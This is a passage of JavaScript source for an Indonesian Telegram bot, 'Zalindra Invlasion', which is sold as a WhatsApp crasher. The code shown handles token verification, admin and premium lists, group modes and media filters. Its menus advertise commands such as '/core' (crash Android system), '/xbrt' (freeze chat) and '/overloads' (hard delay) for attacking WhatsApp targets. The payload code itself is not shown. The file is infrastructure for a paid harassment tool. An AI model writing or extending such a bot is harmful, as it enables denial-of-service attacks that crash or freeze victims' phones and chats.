  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// JAM ///
function getTimeIndonesia() {
  const now = new Date();

  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  return `
🕒 LIVE JAM INDONESIA

🇮🇩 WIB  : ${wib.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WITA : ${wita.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WIT  : ${wit.toLocaleTimeString("id-ID", { hour12: false })}
`;
}
/// cmd of/on ///
function loadCmdMode() {
  try {
    if (!fs.existsSync(CMD_FILE)) {
      fs.writeFileSync(CMD_FILE, JSON.stringify({ disabled: [] }, null, 2));
    }

    const data = JSON.parse(fs.readFileSync(CMD_FILE));

    return {
      disabled: Array.isArray(data.disabled) ? data.disabled : []
    };

  } catch (e) {
    return { disabled: [] };
  }
}

function saveCmdMode(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// midlaware Cmd on / of ///
bot.use((ctx, next) => {
  const data = loadCmdMode();

  const text = ctx.message?.text || ctx.callbackQuery?.data || "";

  if (!text.startsWith("/")) return next(); 

  const cmd = text
    .split(" ")[0]
    .replace(/^\/+/, "")
    .replace(/@.+$/, "")
    .toLowerCase()
    .trim();

  const userId = ctx.from?.id?.toString();

  const isAdminUser =
    adminList.includes(userId) || ownerUsers.includes(userId);

  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  // console.log("CMD:", cmd);
// console.log("DISABLED:", disabled);

  if (disabled.includes(cmd)) {
    if (isAdminUser) return next();
    return ctx.reply("⛔ Command ini sedang dinonaktifkan admin");
  }

  return next();
});
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
🔒 𝐆𝐑𝐎𝐔𝐏 𝐎𝐍𝐋𝐘 𝐌𝐎𝐃𝐄

Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
    }

    return; 
  }

  return next();
});
// ===== Tracker ===== // ontol
const commandList = new Set();

const originalCommand = bot.command.bind(bot);

bot.command = (cmd, ...args) => {
  commandList.add(cmd);
  return originalCommand(cmd, ...args);
};
/// -------- ( menu utama ) --------- \\\
const databaseUrl = "https://raw.githubusercontent.com/seanfutsalmin-beep/Zalin/refs/heads/main/token.json";

const imagePath = "./image/AtomicCrashers.jpg";
const audioPath = "./image/AtomicSound.mp3";

if (!fs.existsSync(imagePath)) {
  throw new Error("❌ File gambar tidak ditemukan: " + imagePath);
}

if (!fs.existsSync(audioPath)) {
  throw new Error("❌ File audio tidak ditemukan: " + audioPath);
}

const getImage = () => ({
  source: fs.createReadStream(imagePath)
});

async function loadingToken(ctx) {
  const steps = [
    ["▰▱▱▱▱ 10%", "Initializing..."],
    ["▰▰▱▱▱ 20%", "Detecting Token..."],
    ["▰▰▰▱▱ 30%", "Checking Format..."],
    ["▰▰▰▰▱ 40%", "Encrypting Request..."],
    ["▰▰▰▰▰ 50%", "Connecting GitHub..."],
    ["▰▰▰▰▰▰ 60%", "Fetching Database..."],
    ["▰▰▰▰▰▰▰ 70%", "Validating Token..."],
    ["▰▰▰▰▰▰▰▰ 80%", "Security Scan..."],
    ["▰▰▰▰▰▰▰▰▰ 90%", "Final Check..."],
    ["▰▰▰▰▰▰▰▰▰▰ 100%", "Access Granted..."]
  ];

  const msg = await ctx.reply("🔐 Starting Verification...");

  for (const [progress, status] of steps) {
    await new Promise(resolve => setTimeout(resolve, 500));

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      msg.message_id,
      undefined,
`🔐 Token Verification

${progress}
${status}`
    );
  }

  
  return msg;
}

bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const userStartMsgId = ctx.message.message_id;

  if (!verifiedUsers.has(userId)) {
    if (!args[0]) {
      return ctx.reply(`
🔑 Masukkan token anda untuk diaktifkan, Format: /start <token>
      `, { parse_mode: "HTML" });
    }

    const inputToken = args[0].trim();
    try {
      const loadingMsg = await loadingToken(ctx);
      const response = await axios.get(databaseUrl);
      const allowedTokens = response.data.tokens || [];

      if (!allowedTokens.includes(inputToken)) {
        await ctx.telegram.deleteMessage(ctx.chat.id, userStartMsgId).catch(() => {});
        await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

        const invalidMsg = await ctx.reply(`
❌ <b>TOKEN INVALID</b>

<b>Status:</b>
• Detect Token ✓
• GitHub Connect ✓
• Validate Token ✗

Silakan gunakan token valid.
        `, { parse_mode: "HTML" });

        await new Promise(resolve => setTimeout(resolve, 2500));
        await ctx.telegram.deleteMessage(ctx.chat.id, invalidMsg.message_id).catch(() => {});
        return;
      }

      verifiedUsers.add(userId);
      await ctx.telegram.deleteMessage(ctx.chat.id, userStartMsgId).catch(() => {});
      await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

      const successMsg = await ctx.reply(`
✅ <b>TOKEN VERIFIED</b>

<b>Status:</b>
• Detect Token ✓
• GitHub Connect ✓
• Validate Token ✓
• Security Scan ✓

Welcome ${ctx.from.first_name}
      `, { parse_mode: "HTML" });

      await new Promise(resolve => setTimeout(resolve, 2000));
      await ctx.telegram.deleteMessage(ctx.chat.id, successMsg.message_id).catch(() => {});

    } catch (err) {
      console.error("Verification Error:", err.message);
      return ctx.reply("❌ Verification Failed.");
    }
  }

 
  const menuMessage = `
<pre>
إِنَّ الصَّلَاةَ كَانَتْ عَلَى الْمُؤْمِنِينَ كِتَابًا مَوْقُوتً
“Sesungguhnya salat itu adalah kewajiban yang telah ditentukan waktunya bagi orang-orang beriman.”
zx
(🎉) ${ctx.from.first_name}
─━━━━━⬡  MAINTENANCE  ⬡━━━━━─
Selamat Datang Di Script Zalindra Invlasion, Silahkan Gunakan Fitur Yg tersedia

⿻ Encrypt : Xata X Badz
⿻ Anti Bypas : Sean Official
⿻ Security : Token gh X Tools By gwh
</pre>`;

  const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto" },
    ],
    [{ text: "797 !", url: "https://t.me/seanoffc" }],
  ];

  await ctx.replyWithPhoto(getImage(), {
    caption: menuMessage,
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: keyboard },
  });

  await ctx.replyWithAudio(
    { source: fs.createReadStream(audioPath) },
    {
      title: "Zvx Ϟ Crashers",
      caption: "Zvx Ϟ Crashers",
      performer: "seankukuk",
    }
  );

}); 

/* const keyboard = [
    [{ text: "Trash - £ore ϟ", callback_data: "/bug" }],
    [
      { text: "Controls - £ore ϟ", callback_data: "/controls" },
      { text: "Thanks - £ore ϟ", callback_data: "/tqto" },
    ],
    [{ text: "797 !", url: "https://t.me/seanoffc" }],
  ];
*/
// ${ctx.from.first_name}
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function checkVerifiedCallback(ctx) {
  const userId = ctx.from.id;

  if (!verifiedUsers.has(userId)) {
    await ctx.answerCbQuery("Verification Required!", { show_alert: true });

    await ctx.reply(
`🔐 <b>Verification Required!</b>

<b>Halo ${ctx.from.first_name}</b>

<b> Woi anjing /start {token} dulu kntl,no spam Button ya anjeng awas aja kalo spam gw ban lu kntl</b>`,
      {
        parse_mode: "HTML"
      }
    );

    return false;
  }

  return true;
}

async function safeEdit(ctx, type, content, keyboard) {
  const userId = ctx.from.id;

  
  const verified = await checkVerifiedCallback(ctx);
  if (!verified) return;

  
  if (isCooldown(userId)) {
    return ctx.answerCbQuery("Tunggu sebentar...");
  }

  try {
    if (type === "media") {
      await sleep(700);

      await ctx.editMessageMedia(
        {
          type: "photo",
          media: getImage(),
          caption: content,
          parse_mode: "HTML",
        },
        {
          reply_markup: {
            inline_keyboard: keyboard,
          },
        }
      );
    }

    if (type === "caption") {
      await sleep(700);

      await ctx.editMessageCaption(content, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: keyboard,
        },
      });
    }

    await ctx.answerCbQuery();

  } catch (error) {

    if (
      error.response &&
      error.response.error_code === 429
    ) {
      const retryAfter = (error.response.parameters?.retry_after || 3) * 1000;

      console.log(`Rate Limited. Retry after ${retryAfter}ms`);

      await ctx.answerCbQuery("Server sibuk, tunggu...");
      await sleep(retryAfter);

      return;
    }

    if (
      error.response &&
      error.response.error_code === 400 &&
      error.response.description.includes("message is not modified")
    ) {
      return ctx.answerCbQuery();
    }

    console.error("Edit Error:", error.response?.description || error.message);

    try {
      await ctx.answerCbQuery("Error");
    } catch {}
  }
}

bot.action(['/start', '/back'], async (ctx) => {
  const menuMessage = `
<pre>
سَأُرِيهِمْ أَنَا لَسْتُ ضَعِيفًا كَمَا يَقُولُونَ
"Akan kuperlihatkan kepada mereka bahwa aku tidak lemah seperti yang mereka katakan!!"

(🎉) ${ctx.from.first_name}
─━━━━━⬡  INFO SCRIPT  ⬡━━━━━─
⿻ Devloper : @seanoffc
⿻ Name Script : 𝚣𝚊𝚕𝚒𝚗𝚍𝚛𝚊 𝚒𝚗𝚟𝚕𝚊𝚜𝚒𝚘𝚗
⿻ Status Script : 𝚅𝚒𝚙, 𝚋𝚞𝚢 𝚘𝚗𝚕𝚢! 
⿻ Version Script : 𝟷𝟶 𝚙𝚛𝚘 𝚎𝚍𝚒𝚝𝚒𝚘𝚗
</pre>`;

  const keyboard = [
  [
    {
      text: "Trash - £ore ϟ",
      callback_data: "/bug",
      style: "success",
      icon_custom_emoji_id: "5787492942738361941"
    }
  ],
  [
    {
      text: "Controls - £ore ϟ",
      callback_data: "/controls",
      style: "success",
      icon_custom_emoji_id: "4956214478002717877"
    },
    {
      text: "Thanks - £ore ϟ",
      callback_data: "/tqto",
      style: "danger",
      icon_custom_emoji_id: "4936309933105744338"
    }
  ],
  [
    {
      text: "797 !",
      url: "https://t.me/seanoffc",
      style: "danger",
      icon_custom_emoji_id: "5787156307496669392"
    }
  ]
];

await safeEdit(ctx, "media", menuMessage, keyboard);
});


bot.action('/controls', async (ctx) => {
  const controlsMenu = `
<blockquote>[ <tg-emoji emoji-id="4956214478002717877">🚀</tg-emoji> ] ⵢ Zalindra - Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra° Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>Two° Premium</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Zalindra°Inflasion Ϟ °Controls</blockquote>
𖥂 /killsesi - <b>delete sessions</b>
𖥂 /connect - <b>add sender number</b>
𖥂 /addadmin - <b>add admin users</b>
𖥂 /deladmin - <b>delete admin users</b>
𖥂 /addprem - <b>add premium users</b>
𖥂 /delprem - <b>delete premium users</b>
𖥂 /cekprem - <b>cek premium users</b>
𖥂 /cekid - <b>cek format users</b>
𖥂 /groupon - <b>group only</b>
𖥂 /groupoff - <b>group off</b>
𖥂 /addgroupremium - <b>add group premium</b>
𖥂 /delgrouppremium - <b>delete group premium</b>
`;

  const keyboard = [[
  {
    text: "ⵢ Back",
    callback_data: "/back",
    style: "primary",
    icon_custom_emoji_id: "5787546290527145353"
  },
  {
    text: "Next ⵢ",
    callback_data: "/controls2",
    style: "primary",
    icon_custom_emoji_id: "5787429669280157600"
  }
]];

await safeEdit(ctx, "caption", controlsMenu, keyboard);
});


bot.action('/controls2', async (ctx) => {
  const controlsMenu2 = `
<blockquote>[ <tg-emoji emoji-id="4958808208752772190">💎</tg-emoji> ] ⵢ Zalin - invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra° Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>Two° Premium</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Zalin° Invlasion Ϟ °Controls</blockquote>
𖥂 /cmdaktif - <b>mengaktifkan cmd yang terkunci</b>
𖥂 /nonaktifcmd - <b>menonaktifkan cmd</b>
𖥂 /listcmd - <b>list cmd mati and hidup</b>
𖥂 /runtime - <b>bot runtime</b>
𖥂 /self - <b>bot di kunci kecuali owner</b>
𖥂 /public - <b>bot di buka untuk umum</b>
𖥂 /antifoto - <b>anti foto di group</b>
𖥂 /antivideo - <b>anti video di group</b>
`;

  const keyboard = [[
  {
    text: "ⵢ Back",
    callback_data: "/controls",
    style: "primary",
    icon_custom_emoji_id: "5787546290527145353"
  },
  {
    text: "Next ⵢ",
    callback_data: "/back",
    style: "primary",
    icon_custom_emoji_id: "5787429669280157600"
  }
]];

await safeEdit(ctx, "caption", controlsMenu2, keyboard);
});


bot.action('/bug', async (ctx) => {
  const bugMenu = `
<blockquote>[ <tg-emoji emoji-id="5875161424342290538">💀</tg-emoji> ] ⵢ Zalindra - Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalin° Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>Two° Premium</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Zalin°Crashers Ϟ °Trash Not Spam</blockquote>
𖥂 /xkyt - forclose X blank
𖥂 /overloads - delay hard x buldo
𖥂 /gloweus - delay type visible
𖥂 /xbrt - freze cht new
`;
//𖥂 /Xzero - <b>bulldozzer 10gb</b>
  const keyboard = [[
  {
    text: "ⵢ Back",
    callback_data: "/back",
    style: "primary",
    icon_custom_emoji_id: "5787546290527145353"
  },
  {
    text: "Next ⵢ",
    callback_data: "/bug2",
    style: "primary",
    icon_custom_emoji_id: "5787429669280157600"
  }
]];

await safeEdit(ctx, "caption", bugMenu, keyboard);
});


bot.action('/bug2', async (ctx) => {
  const bugMenu2 = `
<blockquote>[ <tg-emoji emoji-id="4958642964181025908">📩</tg-emoji> ] ⵢ Zalin - Invlasion</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>Zalindra° Invlasion</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>Two° Premium</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>Zalin°Invlasion Ϟ °Bebas spam Menu</blockquote>
𖥂 /xtum - Delay X Buldo
𖥂 /core - crash sistem andro
`;
//𖥂 /Xvlod - <b>buldozer</b>
  const keyboard = [[
  {
    text: "ⵢ Back",
    callback_data: "/bug",
    style: "primary",
    icon_custom_emoji_id: "5787546290527145353"
  },
  {
    text: "Next ⵢ",
    callback_data: "/back",
    style: "primary",
    icon_custom_emoji_id: "5787429669280157600"
  }
]];

await safeEdit(ctx, "caption", bugMenu2, keyboard);
});


bot.action('/tqto', async (ctx) => {
  const tqtoMenu = `
<blockquote>[ <tg-emoji emoji-id="4936309933105744338">⚖️</tg-emoji> ] ⵢ Atomic - Crashers</blockquote>
─ 「 〄 」Je Suis Un Bot Telegram Utilisé Pour Créer Des Coups De Cœur Sur WhatsApp.

<b>⨭ Name Script</b> : <b>zalindra° Crashers</b>
<b>⨭ Developer</b> : <b>@seanoffc</b>
<b>⨭ Version</b> : <b>Two° Premium</b>
<b>⨭ Prefix</b> : <b>/ ( °Slash )</b>
<b>⨭ Username</b> : ${ctx.from.first_name}

<blockquote>zalindra°Crashers Ϟ °ThaksToo</blockquote>
𖥂 @seanoffc - <b>Creator</b>
𖥂 @FizzOfficialjs - <b>Owner</b>
𖥂 @ArgaXwyz76 - <b>Spesial</b>
𖥂 @Ambakikuk - <b>Spesial</b>
𖥂 @badzzne2 - <b>All Tools</b>
𖥂 @zlvsmakloe - <b>Anomali</b>
`;

  const keyboard = [[
  {
    text: "Back ⵢ",
    callback_data: "/back",
    style: "primary",
    icon_custom_emoji_id: "5787546290527145353"
  }
]];

await safeEdit(ctx, "caption", tqtoMenu, keyboard);
});
/// ------ ( Plugins ) ------- \\\
function getUserId(ctx) {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return null;

  return args[1].replace(/[^0-9]/g, ""); 
}

/// CASE BUAT OWNER MENU ///
bot.command("cekprem", async (ctx) => {
  try {
    let target = ctx.from;

  
    if (ctx.message.reply_to_message) {
      target = ctx.message.reply_to_message.from;
    }

    const userId = target.id.toString();
    const firstName = target.first_name || "-";
    const lastName = target.last_name || "";
    const fullName = `${firstName} ${lastName}`.trim();
    const username = target.username ? `@${target.username}` : "Tidak ada username";

   
    const isUserPremium = premiumUsers.includes(userId);
    const isUserAdmin = adminList.includes(userId);
    const isUserOwner = ownerUsers.includes(userId);

    let status = "Non Premium ❌";

    if (isUserOwner) {
      status = "Owner 👑";
    } else if (isUserAdmin) {
      status = "Admin ⚡";
    } else if (isUserPremium) {
      status = "Premium 💎";
    }

  
    let groupStatus = "Private Chat";
    if (ctx.chat.type !== "private") {
      groupStatus = isGroupPremium(ctx.chat.id)
        ? "Group Premium ✅"
        : "Group Non Premium ❌";
    }

    const teks = `
<blockquote><strong>「 CEK STATUS USER 」</strong></blockquote>
👤 Nama: ${fullName}
🆔 ID: <code>${userId}</code>
🔗 Username: ${username}
💎 Status: ${status}
🏷️ Group: ${groupStatus}
💬 Chat ID: <code>${ctx.chat.id}</code>
`;

    await ctx.reply(teks, {
      parse_mode: "HTML"
    });

  } catch (e) {
    console.error("CEKPREM ERROR:", e);

    await ctx.reply(
      `❌ Error saat cek premium\n${e.message}`
    );
  }
});

bot.command("listcmd", checkAdmin, async (ctx) => {
  const data = loadCmdMode();
  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  const allCommands = [...commandList];

  const active = allCommands.filter(c => !disabled.includes(c));

  const activeList = active.length
    ? active.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  const disabledList = disabled.length
    ? disabled.map(c => `➤ /${c}`).join("\n")
    : "Tidak ada";

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
    {
      caption:
`<pre>📊 SYSTEM COMMAND

┌─ ✅ CMD AKTIF
${activeList}

└─ ⛔ CMD NONAKTIF
${disabledList}</pre>`,
      parse_mode: "HTML"
    }
  );
});

bot.command("addgroupremium", checkOwner, async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini sudah PREMIUM");
    }

  
    premiumGroups.push(groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dijadikan PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  try {
    
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Command ini hanya bisa digunakan di group");
    }

    const groupId = ctx.chat.id.toString();
    let premiumGroups = loadPremiumGroups();

    
    if (!premiumGroups.includes(groupId)) {
      return ctx.reply("⚠️ Group ini bukan premium");
    }

    
    premiumGroups = premiumGroups.filter(id => id !== groupId);

    savePremiumGroups(premiumGroups);

    return ctx.reply("✅ Group berhasil dihapus dari PREMIUM");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.command("cekowner", (ctx) => {
  const data = loadJSON(ownerFile);
  ctx.reply(`ID kamu: ${ctx.from.id}\nOwner list: ${data.join(", ")}`);
});


bot.command("addadmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addadmin 123");

  if (adminList.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah admin.`);
  }

  addAdmin(userId);
  ctx.reply(`✅ Berhasil tambah ${userId} jadi admin`);
});


bot.command("addprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /addprem 123");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ User ${userId} sudah premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`✅ Berhasil tambah ${userId} jadi premium`);
});


bot.command("deladmin", checkOwner, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /deladmin 123");

  if (!adminList.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di admin.`);
  }

  removeAdmin(userId);
  ctx.reply(`🚫 Berhasil hapus ${userId} dari admin`);
});


bot.command("delprem", checkAdmin, (ctx) => {
  const userId = getUserId(ctx)?.toString();
  if (!userId) return ctx.reply("Example: /delprem 123");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ User ${userId} tidak ada di premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  ctx.reply(`🚫 Berhasil hapus ${userId} dari premium`);
});

bot.command("antivideo", async (ctx) => {
  try {
   
    if (ctx.chat.type === "private") {
      return ctx.reply("❌ Hanya bisa di group");
    }

    const chatId = ctx.chat.id.toString();

    
    const member = await ctx.getChatMember(ctx.from.id);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply("❌ Hanya admin yang bisa pakai command ini");
    }

    const args = ctx.message.text.split(" ")[1];
    if (!args) {
      return ctx.reply("📌 Format: /antivideo on /off");
    }

  
    if (args === "on") {
      if (!antiVideoGroups.includes(chatId)) {
        antiVideoGroups.push(chatId);
        saveAntiVideo(antiVideoGroups);
      }
      return ctx.reply("✅ Anti video aktif di grup ini");
    }

   
    if (args === "off") {
      antiVideoGroups = antiVideoGroups.filter(id => id !== chatId);
      saveAntiVideo(antiVideoGroups);
      return ctx.reply("❌ Anti video dimatikan");
    }

    return ctx.reply("📌 Gunakan: /antivideo on /off");
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error");
  }
});

bot.on("video", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiVideoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim video di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})


bot.command("antifoto", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Hanya bisa di group")
  }

  
  const member = await ctx.getChatMember(ctx.from.id)
  if (!["administrator", "creator"].includes(member.status)) {
    return ctx.reply("❌ Hanya admin yang bisa pakai command ini")
  }

  const args = ctx.message.text.split(" ")[1]
  if (!args) return ctx.reply("📌 Format: /antifoto on /off")

  const chatId = ctx.chat.id.toString()

  if (args === "on") {
    if (!antiFotoGroups.includes(chatId)) {
      antiFotoGroups.push(chatId)
      saveAntiFoto(antiFotoGroups)
    }
    return ctx.reply("✅ Anti foto aktif di grup ini")
  }

  if (args === "off") {
    antiFotoGroups = antiFotoGroups.filter(id => id !== chatId)
    saveAntiFoto(antiFotoGroups)
    return ctx.reply("❌ Anti foto dimatikan")
  }

  ctx.reply("📌 Gunakan: /antifoto on /off")
})

bot.on("photo", async (ctx) => {
  const chatId = ctx.chat.id.toString()
  if (!antiFotoGroups.includes(chatId)) return

  try {
    await ctx.deleteMessage()

    await ctx.reply(
      `⚠️ @${ctx.from.username || ctx.from.first_name}\n🚫 Dilarang mengirim foto di grup ini!`,
      { parse_mode: "Markdown" }
    )

  } catch (err) {
    console.log("Error:", err.message)
  }
})

bot.command("groupon", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("on");
  ctx.reply("👥 Group Only berhasil diaktifkan.");
});

bot.command("groupoff", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setGroupMode("off");
  ctx.reply("🌍 Group Only dimatikan.");
});

bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("self");
  ctx.reply("🔒 Bot Di kunci Owner.");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  setMode("public");
  ctx.reply("🔓 Bot di buka oleh Owner.");
});

bot.command("runtime", (ctx) => {
  const uptime = process.uptime();
  const h = Math.floor(uptime / 3600);
  const m = Math.floor((uptime % 3600) / 60);
  const s = Math.floor(uptime % 60);

  ctx.reply(
`┏━━━〔 RUNTIME 〕━━━┓
┃ 🤖 Bot Active
┃ ⏳ ${h} Jam ${m} Menit ${s} Detik
┗━━━━━━━━━━━━━━━━━━┛`
  );
});


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ Khusus owner!");

  const args = ctx.message.text.split(" ")[1];

  if (!args) {
    return ctx.reply("Gunakan:\n/anticulik on\n/anticulik off\n/anticulik autoreject");
  }

  if (args === "on") {
    antiCulik = true;
    autoReject = false;
    ctx.reply("✅ AntiCulik ON");
  } else if (args === "off") {
    antiCulik = false;
    ctx.reply("❌ AntiCulik OFF");
  } else if (args === "autoreject") {
    antiCulik = true;
    autoReject = true;
    ctx.reply("🚫 Auto Reject ON");
  }
});

bot.command("addsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (ctx.chat.type === "private") {
    return ctx.reply("❌ Gunakan di group");
  }

  const id = ctx.chat.id.toString();

  if (whitelistGroups.includes(id)) {
    return ctx.reply("⚠️ Group Sudah di Safe");
  }

  whitelistGroups.push(id);
  saveSafe(whitelistGroups);

  ctx.reply("✅ Group SAFE");
});

bot.command("delsafe", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  const id = ctx.chat.id.toString();

  whitelistGroups = whitelistGroups.filter(v => v !== id);
  saveSafe(whitelistGroups);

  ctx.reply("❌ SAFE Group dihapus");
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const status = ctx.update.my_chat_member.new_chat_member.status;

    if (status !== "member" && status !== "administrator") return;
    if (!antiCulik) return;

    const chat = ctx.chat;
    const groupId = chat.id;
    const groupName = chat.title;

  
    if (isSafeGroup(groupId)) return;

    const from = ctx.update.my_chat_member.from;

    const userId = from.id;
    const username = from.username ? "@" + from.username : "Tidak ada";
    const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

   
    if (autoReject) {
      try {
        await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
        await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
        await ctx.telegram.leaveChat(groupId);
      } catch {}
      return;
    }

   
    pendingGroups.set(groupId, {
      userId,
      username,
      fullName,
      groupName
    });

    
    for (let ownerId of loadOwner()) {
      try {
        await bot.telegram.sendMessage(
          ownerId,
`🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
          {
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                  { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                ]
              ]
            }
          }
        );
      } catch {}
    }

  } catch (err) {
    console.log("AntiCulik error:", err);
  }
});

bot.action(/(allow|deny)_(.+)/, async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
  }

  const action = ctx.match[1];
  const groupId = Number(ctx.match[2]);

  const data = pendingGroups.get(groupId);

  try { await ctx.deleteMessage(); } catch {}

  if (action === "allow") {
    pendingGroups.delete(groupId);

    await ctx.reply("✅ Bot diizinkan");

    try {
      await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
    } catch {}
  }

  if (action === "deny") {
    pendingGroups.delete(groupId);

    await ctx.reply("❌ Bot ditolak");

    try {
      await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");

      if (data?.userId) {
        await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
      }

      await ctx.telegram.leaveChat(groupId);
    } catch {}
  }
});
///// ×××××÷×××××××× ////
bot.command("cmdaktif", checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
